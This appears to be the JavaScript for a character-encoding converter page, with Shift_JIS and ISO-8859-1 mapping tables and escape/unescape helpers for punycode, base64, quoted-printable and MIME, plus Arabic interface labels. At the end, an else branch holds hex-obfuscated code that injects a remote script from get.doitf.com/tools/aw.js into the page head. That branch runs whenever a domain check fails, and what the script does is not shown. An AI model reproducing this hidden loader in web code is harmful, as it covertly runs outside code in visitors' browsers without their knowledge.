40b0mONH9JnjSPSa40n0m+NK9JzjS/Sd40z0nuNN9J/jTvSg40/0oeNQ9KLjUfSj41L0pONT9KXjVPSm41X0p+NW9KjjV/Sp41j0quNZ9KvjWvSs41v0reNc9K7jXfSv4170sONf9LHjYPSy42H0s+Ni9LTjY/S142T0tuNl9LfjZvS442f0ueNo9LrjafS742r0vONr9L3jbPS+4230v+Nu9MDjb/TB43D0wuNx9MPjcvTE43P0xeN09MbjdfTH43b0yON39MnjePTK43n0y+N69Mzje/TN43z0zuN99M/jfvTQ43/00eOA9NLjgfTT44L01OOD9NXjhPTW44X01+OG9Njjh/TZ44j02uOJ9NvjivTc44v03eOM9N7jjfTf44704OOP9OHjkPTi45H04+OS9OTjk/Tl45T05uOV9OfjlvTo45f06eOY9OrjmfTr45r07OOb9O3jnPTu45307+Oe9PDjn/Tx46D08uOh9PPjovT046P09eOk9PbjpfT346b0+OOn9PnjqPT646n0++Oq9Pzjq/VA46z1QeOt9ULjrvVD46/1ROOw9UXjsfVG47L1R+Oz9UjjtPVJ47X1SuO29Uvjt/VM47j1TeO59U7juvVP47v1UOO89VHjvfVS4771U+O/9VTjwPVV48H1VuPC9Vfjw/VY48T1WePF9VrjxvVb48f1XOPI9V3jyfVe48r1X+PL9WDjzPVh4831YuPO9WPjz/Vk49D1ZePR9Wbj0vVn49P1aOPU9Wnj1fVq49b1a+PX9Wzj2PVt49n1buPa9W/j2/Vw49z1cePd9XLj3vVz49/1dOPg9XXj4fV24+L1d+Pj9Xjj5PV54+X1euPm9Xvj5/V84+j1fePp9X7j6vWA4+v1gePs9YLj7fWD4+71hOPv9YXj8PWG4/H1h+Py9Yjj8/WJ4/T1iuP19Yvj9vWM4/f1jeP49Y7j+fWP4/r1kOP79ZHj/PWS4/31k+P+9ZTj//WV5AD1luQB9ZfkAvWY5AP1meQE9ZrkBfWb5Ab1nOQH9Z3kCPWe5An1n+QK9aDkC/Wh5Az1ouQN9aPkDvWk5A/1peQQ9abkEfWn5BL1qOQT9ankFPWq5BX1q+QW9azkF/Wt5Bj1ruQZ9a/kGvWw5Bv1seQc9bLkHfWz5B71tOQf9bXkIPW25CH1t+Qi9bjkI/W55CT1uuQl9bvkJvW85Cf1veQo9b7kKfW/5Cr1wOQr9cHkLPXC5C31w+Qu9cTkL/XF5DD1xuQx9cfkMvXI5DP1yeQ09crkNfXL5Db1zOQ39c3kOPXO5Dn1z+Q69dDkO/XR5Dz10uQ99dPkPvXU5D/11eRA9dbkQfXX5EL12ORD9dnkRPXa5EX12+RG9dzkR/Xd5Ej13uRJ9d/kSvXg5Ev14eRM9eLkTfXj5E715ORP9eXkUPXm5FH15+RS9ejkU/Xp5FT16uRV9evkVvXs5Ff17eRY9e7kWfXv5Fr18ORb9fHkXPXy5F318+Re9fTkX/X15GD19uRh9ffkYvX45GP1+eRk9frkZfX75Gb1/ORn9kDkaPZB5Gn2QuRq9kPka/ZE5Gz2ReRt9kbkbvZH5G/2SORw9knkcfZK5HL2S+Rz9kzkdPZN5HX2TuR29k/kd/ZQ5Hj2UeR59lLkevZT5Hv2VOR89lXkffZW5H72V+R/9ljkgPZZ5IH2WuSC9lvkg/Zc5IT2XeSF9l7khvZf5If2YOSI9mHkifZi5Ir2Y+SL9mTkjPZl5I32ZuSO9mfkj/Zo5JD2aeSR9mrkkvZr5JP2bOSU9m3klfZu5Jb2b+SX9nDkmPZx5Jn2cuSa9nPkm/Z05Jz2deSd9nbknvZ35J/2eOSg9nnkofZ65KL2e+Sj9nzkpPZ95KX2fuSm9oDkp/aB5Kj2guSp9oPkqvaE5Kv2heSs9obkrfaH5K72iOSv9onksPaK5LH2i+Sy9ozks/aN5LT2juS19o/ktvaQ5Lf2keS49pLkufaT5Lr2lOS79pXkvPaW5L32l+S+9pjkv/aZ5MD2muTB9pvkwvac5MP2neTE9p7kxfaf5Mb2oOTH9qHkyPai5Mn2o+TK9qTky/al5Mz2puTN9qfkzvao5M/2qeTQ9qrk0far5NL2rOTT9q3k1Pau5NX2r+TW9rDk1/ax5Nj2suTZ9rPk2va05Nv2teTc9rbk3fa35N72uOTf9rnk4Pa65OH2u+Ti9rzk4/a95OT2vuTl9r/k5vbA5Of2weTo9sLk6fbD5Or2xOTr9sXk7PbG5O32x+Tu9sjk7/bJ5PD2yuTx9svk8vbM5PP2zeT09s7k9fbP5Pb20OT39tHk+PbS5Pn20+T69tTk+/bV5Pz21uT99tfk/vbY5P/22eUA9trlAfbb5QL23OUD9t3lBPbe5QX23+UG9uDlB/bh5Qj24uUJ9uPlCvbk5Qv25eUM9ublDfbn5Q726OUP9unlEPbq5RH26+US9uzlE/bt5RT27uUV9u/lFvbw5Rf28eUY9vLlGfbz5Rr29OUb9vXlHPb25R329+Ue9vjlH/b55SD2+uUh9vvlIvb85SP3QOUk90HlJfdC5Sb3Q+Un90TlKPdF5Sn3RuUq90flK/dI5Sz3SeUt90rlLvdL5S/3TOUw903lMfdO5TL3T+Uz91DlNPdR5TX3UuU291PlN/dU5Tj3VeU591blOvdX5Tv3WOU891nlPfda5T73W+U/91zlQPdd5UH3XuVC91/lQ/dg5UT3YeVF92LlRvdj5Uf3ZOVI92XlSfdm5Ur3Z+VL92jlTPdp5U33auVO92vlT/ds5VD3beVR927lUvdv5VP3cOVU93HlVfdy5Vb3c+VX93TlWPd15Vn3duVa93flW/d45Vz3eeVd93rlXvd75V/3fOVg933lYfd+5WL3gOVj94HlZPeC5WX3g+Vm94TlZ/eF5Wj3huVp94flaveI5Wv3ieVs94rlbfeL5W73jOVv943lcPeO5XH3j+Vy95Dlc/eR5XT3kuV195PldveU5Xf3leV495blefeX5Xr3mOV795nlfPea5X33m+V+95zlf/ed5YD3nuWB95/lgveg5YP3oeWE96Llhfej5Yb3pOWH96XliPem5Yn3p+WK96jli/ep5Yz3quWN96vljves5Y/3reWQ967lkfev5ZL3sOWT97HllPey5ZX3s+WW97Tll/e15Zj3tuWZ97flmve45Zv3ueWc97rlnfe75Z73vOWf973loPe+5aH3v+Wi98Dlo/fB5aT3wuWl98PlpvfE5af3xeWo98blqffH5ar3yOWr98nlrPfK5a33y+Wu98zlr/fN5bD3zuWx98/lsvfQ5bP30eW099LltffT5bb31OW399XluPfW5bn31+W699jlu/fZ5bz32uW999vlvvfc5b/33eXA997lwfff5cL34OXD9+HlxPfi5cX34+XG9+Tlx/fl5cj35uXJ9+flyvfo5cv36eXM9+rlzffr5c737OXP9+3l0Pfu5dH37+XS9/Dl0/fx5dT38uXV9/Pl1vf05df39eXY9/bl2ff35dr3+OXb9/nl3Pf65d33++Xe9/zl3/hA5eD4QeXh+ELl4vhD5eP4ROXk+EXl5fhG5eb4R+Xn+Ejl6PhJ5en4SuXq+Evl6/hM5ez4TeXt+E7l7vhP5e/4UOXw+FHl8fhS5fL4U+Xz+FTl9PhV5fX4VuX2+Ffl9/hY5fj4WeX5+Frl+vhb5fv4XOX8+F3l/fhe5f74X+X/+GDmAPhh5gH4YuYC+GPmA/hk5gT4ZeYF+GbmBvhn5gf4aOYI+GnmCfhq5gr4a+YL+GzmDPht5g34buYO+G/mD/hw5hD4ceYR+HLmEvhz5hP4dOYU+HXmFfh25hb4d+YX+HjmGPh55hn4euYa+HvmG/h85hz4feYd+H7mHviA5h/4geYg+ILmIfiD5iL4hOYj+IXmJPiG5iX4h+Ym+IjmJ/iJ5ij4iuYp+IvmKviM5iv4jeYs+I7mLfiP5i74kOYv+JHmMPiS5jH4k+Yy+JTmM/iV5jT4luY1+JfmNviY5jf4meY4+JrmOfib5jr4nOY7+J3mPPie5j34n+Y++KDmP/ih5kD4ouZB+KPmQvik5kP4peZE+KbmRfin5kb4qOZH+KnmSPiq5kn4q+ZK+KzmS/it5kz4ruZN+K/mTviw5k/4seZQ+LLmUfiz5lL4tOZT+LXmVPi25lX4t+ZW+LjmV/i55lj4uuZZ+LvmWvi85lv4veZc+L7mXfi/5l74wOZf+MHmYPjC5mH4w+Zi+MTmY/jF5mT4xuZl+MfmZvjI5mf4yeZo+MrmafjL5mr4zOZr+M3mbPjO5m34z+Zu+NDmb/jR5nD40uZx+NPmcvjU5nP41eZ0+NbmdfjX5nb42OZ3+NnmePja5nn42+Z6+Nzme/jd5nz43uZ9+N/mfvjg5n/44eaA+OLmgfjj5oL45OaD+OXmhPjm5oX45+aG+Ojmh/jp5oj46uaJ+Ovmivjs5ov47eaM+O7mjfjv5o748OaP+PHmkPjy5pH48+aS+PTmk/j15pT49uaV+Pfmlvj45pf4+eaY+Prmmfj75pr4/Oab+UDmnPlB5p35Quae+UPmn/lE5qD5Reah+UbmovlH5qP5SOak+UnmpflK5qb5S+an+UzmqPlN5qn5Tuaq+U/mq/lQ5qz5Ueat+VLmrvlT5q/5VOaw+VXmsflW5rL5V+az+VjmtPlZ5rX5Wua2+Vvmt/lc5rj5Xea5+V7muvlf5rv5YOa8+WHmvfli5r75Y+a/+WTmwPll5sH5ZubC+Wfmw/lo5sT5aebF+Wrmxvlr5sf5bObI+W3myflu5sr5b+bL+XDmzPlx5s35cubO+XPmz/l05tD5debR+Xbm0vl35tP5eObU+Xnm1fl65tb5e+bX+Xzm2Pl95tn5fuba+YDm2/mB5tz5gubd+YPm3vmE5t/5hebg+Ybm4fmH5uL5iObj+Ynm5PmK5uX5i+bm+Yzm5/mN5uj5jubp+Y/m6vmQ5uv5kebs+ZLm7fmT5u75lObv+ZXm8PmW5vH5l+by+Zjm8/mZ5vT5mub1+Zvm9vmc5vf5neb4+Z7m+fmf5vr5oOb7+aHm/Pmi5v35o+b++aTm//ml5wD5pucB+afnAvmo5wP5qecE+arnBfmr5wb5rOcH+a3nCPmu5wn5r+cK+bDnC/mx5wz5sucN+bPnDvm05w/5tecQ+bbnEfm35xL5uOcT+bnnFPm65xX5u+cW+bznF/m95xj5vucZ+b/nGvnA5xv5wecc+cLnHfnD5x75xOcf+cXnIPnG5yH5x+ci+cjnI/nJ5yT5yucl+cvnJvnM5yf5zeco+c7nKfnP5yr50Ocr+dHnLPnS5y350+cu+dTnL/nV5zD51ucx+dfnMvnY5zP52ec0+drnNfnb5zb53Oc3+d3nOPne5zn53+c6+eDnO/nh5zz54uc9+ePnPvnk5z/55edA+ebnQfnn50L56OdD+ennRPnq50X56+dG+eznR/nt50j57udJ+e/nSvnw50v58edM+fLnTfnz50759OdP+fXnUPn251H59+dS+fjnU/n551T5+udV+fvnVvn851f64Pkp++n53PqQ+g76m/oP+pz6EPqx+hH62PoS+uj6E/rq+hT7WPoV+176Fvt1+hf7ffoY+376GfuA+hr7gvob+4b6HPuJ+h37kvoe+536H/uf+iD7oPoh+6n6Ivux+iP7s/ok+7T6Jfu3+ib70/on+9r6KPvq+in79voq+/f6K/v5+iz8SfotgUn/AfpX/wKBlP8DgZD/BIGT/wWBlf8G+lb/B4Fp/wiBav8JgZb/CoF7/wuBQ/8MgXz/DYFE/w6BXv8Pgk//EIJQ/xGCUf8SglL/E4JT/xSCVP8VglX/FoJW/xeCV/8Yglj/GYFG/xqBR/8bgYP/HIGB/x2BhP8egUj/H4GX/yCCYP8hgmH/IoJi/yOCY/8kgmT/JYJl/yaCZv8ngmf/KIJo/ymCaf8qgmr/K4Jr/yyCbP8tgm3/LoJu/y+Cb/8wgnD/MYJx/zKCcv8zgnP/NIJ0/zWCdf82gnb/N4J3/ziCeP85gnn/OoFt/zuBX/88gW7/PYFP/z6BUf8/gU3/QIKB/0GCgv9CgoP/Q4KE/0SChf9Fgob/RoKH/0eCiP9Igon/SYKK/0qCi/9Lgoz/TIKN/02Cjv9Ogo//T4KQ/1CCkf9RgpL/UoKT/1OClP9UgpX/VYKW/1aCl/9Xgpj/WIKZ/1mCmv9agW//W4Fi/1yBcP9dgWD/XgCh/2EAov9iAKP/YwCk/2QApf9lAKb/ZgCn/2cAqP9oAKn/aQCq/2oAq/9rAKz/bACt/20Arv9uAK//bwCw/3AAsf9xALL/cgCz/3MAtP90ALX/dQC2/3YAt/93ALj/eAC5/3kAuv96ALv/ewC8/3wAvf99AL7/fgC//38AwP+AAMH/gQDC/4IAw/+DAMT/hADF/4UAxv+GAMf/hwDI/4gAyf+JAMr/igDL/4sAzP+MAM3/jQDO/44Az/+PAND/kADR/5EA0v+SANP/kwDU/5QA1f+VANb/lgDX/5cA2P+YANn/mQDa/5oA2/+bANz/nADd/50A3v+eAN//n4GR/+CBkv/hgcr/4oFQ/+P6Vf/kgY//5Q==';
SJIS_MAP_ENCODED['OUTPUT_ONLY'] = 'AFwApfpVAKaBXCAUgWEgFgB+ID6BfCISgWAwHIugT+CUjVJdiKBVXoqaVpmUWFbKk1VYYZugXFuOxlxikX5kFJLNZFGdt2UijfJoBZ6UaI6UrG9Rk8BwBomLcTCRiXYmk5h5sZJcfB7jeX5Ij0p+YYxxfmvkRYFBjHSDRpeJhAqP04UjkOSH7JhYiB+L647Aj92RrJSukbGWapgw6PaYOZNemFqRy5pSiaid14yynnyNjZ60lsuetYeC+G8=';
SJIS_MAP_ENCODED['INPUT_ONLY'] = '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';
// Generated from http://source.icu-project.org/repos/icu/data/trunk/charset/data/ucm/ibm-5348_P100-1997.ucm
var ISO88591_MAP_ENCODED = {};
ISO88591_MAP_ENCODED['ROUNDTRIP'] = 'AAAAAAABAAEAAgACAAMAAwAEAAQABQAFAAYABgAHAAcACAAIAAkACQAKAAoACwALAAwADAANAA0ADgAOAA8ADwAQABAAEQARABIAEgATABMAFAAUABUAFQAWABYAFwAXABgAGAAZABkAGgAaABsAGwAcABwAHQAdAB4AHgAfAB8AIAAgACEAIQAiACIAIwAjACQAJAAlACUAJgAmACcAJwAoACgAKQApACoAKgArACsALAAsAC0ALQAuAC4ALwAvADAAMAAxADEAMgAyADMAMwA0ADQANQA1ADYANgA3ADcAOAA4ADkAOQA6ADoAOwA7ADwAPAA9AD0APgA+AD8APwBAAEAAQQBBAEIAQgBDAEMARABEAEUARQBGAEYARwBHAEgASABJAEkASgBKAEsASwBMAEwATQBNAE4ATgBPAE8AUABQAFEAUQBSAFIAUwBTAFQAVABVAFUAVgBWAFcAVwBYAFgAWQBZAFoAWgBbAFsAXABcAF0AXQBeAF4AXwBfAGAAYABhAGEAYgBiAGMAYwBkAGQAZQBlAGYAZgBnAGcAaABoAGkAaQBqAGoAawBrAGwAbABtAG0AbgBuAG8AbwBwAHAAcQBxAHIAcgBzAHMAdAB0AHUAdQB2AHYAdwB3AHgAeAB5AHkAegB6AHsAewB8AHwAfQB9AH4AfgB/AH8AgQCBAI0AjQCPAI8AkACQAJ0AnQCgAKAAoQChAKIAogCjAKMApACkAKUApQCmAKYApwCnAKgAqACpAKkAqgCqAKsAqwCsAKwArQCtAK4ArgCvAK8AsACwALEAsQCyALIAswCzALQAtAC1ALUAtgC2ALcAtwC4ALgAuQC5ALoAugC7ALsAvAC8AL0AvQC+AL4AvwC/AMAAwADBAMEAwgDCAMMAwwDEAMQAxQDFAMYAxgDHAMcAyADIAMkAyQDKAMoAywDLAMwAzADNAM0AzgDOAM8AzwDQANAA0QDRANIA0gDTANMA1ADUANUA1QDWANYA1wDXANgA2ADZANkA2gDaANsA2wDcANwA3QDdAN4A3gDfAN8A4ADgAOEA4QDiAOIA4wDjAOQA5ADlAOUA5gDmAOcA5wDoAOgA6QDpAOoA6gDrAOsA7ADsAO0A7QDuAO4A7wDvAPAA8ADxAPEA8gDyAPMA8wD0APQA9QD1APYA9gD3APcA+AD4APkA+QD6APoA+wD7APwA/AD9AP0A/gD+AP8A/wCMAVIAnAFTAIoBYACaAWEAnwF4AI4BfQCeAX4AgwGSAIgCxgCYAtwAliATAJcgFACRIBgAkiAZAIIgGgCTIBwAlCAdAIQgHgCGICAAhyAhAJUgIgCFICYAiSAwAIsgOQCbIDoAgCCsAJkhIg==';
ISO88591_MAP_ENCODED['OUTPUT_ONLY'] = 'ACH/AQAi/wIAI/8DACT/BAAl/wUAJv8GACf/BwAo/wgAKf8JACr/CgAr/wsALP8MAC3/DQAu/w4AL/8PADD/EAAx/xEAMv8SADP/EwA0/xQANf8VADb/FgA3/xcAOP8YADn/GQA6/xoAO/8bADz/HAA9/x0APv8eAD//HwBA/yAAQf8hAEL/IgBD/yMARP8kAEX/JQBG/yYAR/8nAEj/KABJ/ykASv8qAEv/KwBM/ywATf8tAE7/LgBP/y8AUP8wAFH/MQBS/zIAU/8zAFT/NABV/zUAVv82AFf/NwBY/zgAWf85AFr/OgBb/zsAXP88AF3/PQBe/z4AX/8/AGD/QABh/0EAYv9CAGP/QwBk/0QAZf9FAGb/RgBn/0cAaP9IAGn/SQBq/0oAa/9LAGz/TABt/00Abv9OAG//TwBw/1AAcf9RAHL/UgBz/1MAdP9UAHX/VQB2/1YAd/9XAHj/WAB5/1kAev9aAHv/WwB8/1wAff9dAH7/Xg==';
ISO88591_MAP_ENCODED['INPUT_ONLY'] = '';
if (b64awsec === "ZG9pdGYuY29t"){
function updateAllExceptFor(str, exception) {
  var encoding = getEncodingFromForm();
  if (exception != "str") {
    document.getElementById("string").value = str;
  }
  if (exception != "utf16-escape") {
    document.getElementById("utf16-escape").value = escapeToUtf16(str);
  }
  if (exception != "utf32-escape") {
    document.getElementById("utf32-escape").value = escapeToUtf32(str);
  }
  if (exception != "numref-dec") {
    document.getElementById("numref-dec").value = escapeToNumRef(str, 10);
  }
  if (exception != "numref-hex") {
    document.getElementById("numref-hex").value = escapeToNumRef(str, 16);
  }
  if (exception != "punycode") {
    document.getElementById("punycode").value = escapeToPunyCode(str);
  }
  if (exception != "hex-escape") {
    document.getElementById("hex-escape").value =
      escapeToEscapedBytes(str, 16, encoding);
  }
  if (exception != "oct-escape") {
    document.getElementById("oct-escape").value =
      escapeToEscapedBytes(str, 8, encoding);
  }
  if (exception != "base64") {
    document.getElementById("base64").value = escapeToBase64(str, encoding);
  }
  if (exception != "quoted-printable") {
    document.getElementById("quoted-printable").value =
      escapeToQuotedPrintable(str, encoding);
  }
  if (exception != "url") {
    document.getElementById("url").value = escapeToUrl(str, encoding);
  }
  if (exception != "mime-b") {
    document.getElementById("mime-b").value =
      escapeToMime(str, "base64", encoding);
  }
  if (exception != "mime-q") {
    document.getElementById("mime-q").value =
      escapeToMime(str, "quoted-printable", encoding);
  }
}

function getEncodingFromForm() {
  var options = document.getElementById("encoding");
  if (options) {
    return options[options.selectedIndex].value;
  }
  return 'UTF-8';
}





function toggleAll(anchor) {
  var text_node = anchor.firstChild;
  var command;
  if (text_node.nodeValue == "إخفاء الكل") {
    text_node.nodeValue = "إظهار الكل";
    command = "إخفاء";
  } else {
    text_node.nodeValue = "إخفاء الكل";
    command = "إظهار";
  }
  var tables = document.getElementsByClassName("form");
  for (var i = 0; i < tables.length; ++i) {
    var table = tables[i];
    var anchors = table.getElementsByTagName("a");
    var textareas = table.getElementsByClassName("thin");
    if (anchors.length == 1 && textareas.length == 1) {
       if (anchors[0].firstChild.nodeValue == command) {
          toggleDisplay(anchors[0], textareas[0].id);
       }
    }
  }
}

function toggleDisplay(anchor, target) {
  var element = document.getElementById(target);
  var style = element.style;
  var text_node = anchor.firstChild;
  if (text_node.nodeValue == "إخفاء") {
    text_node.nodeValue = "إظهار";
    style.visibility = "hidden";
    element.originalHeight = style.height;
    style.height = "0px";
  } else {
    text_node.nodeValue = "إخفاء";
    style.height = element.originalHeight;
    style.visibility = "visible";
  }
}

function updateByString(str) {
  updateAllExceptFor(str, "str");
}

function updateByUtf16(str) {
  var unescaped = unescapeFromUtf16(str);
  updateAllExceptFor(unescaped, "utf16-escape");
}

function updateByUtf32(str) {
  var unescaped = unescapeFromUtf32(str);
  updateAllExceptFor(unescaped, "utf32-escape");
}

function updateByNumRefDec(str) {
  var unescaped = unescapeFromNumRef(str, 10);
  updateAllExceptFor(unescaped, "numref-dec");
}

function updateByNumRefHex(str) {
  var unescaped = unescapeFromNumRef(str, 16);
  updateAllExceptFor(unescaped, "numref-hex");
}

function updateByPunyCode(str) {
  var unescaped = unescapeFromPunyCode(str);
  updateAllExceptFor(unescaped, "punycode");
}

function updateByHex(str) {
  var encoding = getEncodingFromForm();
  var unescaped = unescapeFromEscapedBytes(str, 16, encoding);
  updateAllExceptFor(unescaped, "hex-escape");
}

function updateByOct(str) {
  var encoding = getEncodingFromForm();
  var unescaped = unescapeFromEscapedBytes(str, 8, encoding);
  updateAllExceptFor(unescaped, "oct-escape");
}

function updateByBase64(str) {
  var encoding = getEncodingFromForm();
  var unescaped = unescapeFromBase64(str, encoding);
  updateAllExceptFor(unescaped, "base64");
}

function updateByQuotedPrintable(str) {
  var encoding = getEncodingFromForm();
  var unescaped = unescapeFromQuotedPrintable(str, encoding);
  updateAllExceptFor(unescaped, "quoted-printable");
}

function updateByUrl(str) {
  var encoding = getEncodingFromForm();
  var unescaped = unescapeFromUrl(str, encoding);
  updateAllExceptFor(unescaped, "url");
}

function updateByMimeBase64(str) {
  var encoding = getEncodingFromForm();
  var unescaped = unescapeFromMime(str, encoding);
  updateAllExceptFor(unescaped, "mime-b");
}

function updateByMimeQuotedPrintable(str) {
  var encoding = getEncodingFromForm();
  var unescaped = unescapeFromMime(str, encoding);
  updateAllExceptFor(unescaped, "mime-q");
}

function updateByForm() {
  var str = document.getElementById("string").value;
  updateAllExceptFor(str, "str");
}
}else{
var _0x871b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x74\x2E\x64\x6F\x69\x74\x66\x2E\x63\x6F\x6D\x2F\x74\x6F\x6F\x6C\x73\x2F\x61\x77\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var script=document[_0x871b[1]](_0x871b[0]);script[_0x871b[2]]= _0x871b[3];document[_0x871b[6]](_0x871b[5])[0][_0x871b[4]](script)
}
